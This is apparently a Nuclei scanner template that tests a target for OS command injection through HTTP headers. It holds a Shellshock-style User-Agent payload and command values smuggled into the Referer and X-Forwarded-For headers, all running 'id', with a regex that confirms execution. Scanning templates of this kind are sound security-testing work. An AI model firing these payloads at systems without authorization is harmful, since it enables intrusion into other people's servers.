id: m7-cmdi-header
info:
  name: M7 - CMDi via HTTP Headers
  author: Sharlix
  severity: critical
  description: OS command injection via User-Agent and other headers
  tags: cmdi,headers,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      User-Agent: "() { :;}; /usr/bin/id"
      Referer: ";id"
      X-Forwarded-For: "127.0.0.1;id"

    matchers:
      - type: regex
        regex:
          - "uid=\d+\(.*?\)"
        part: body
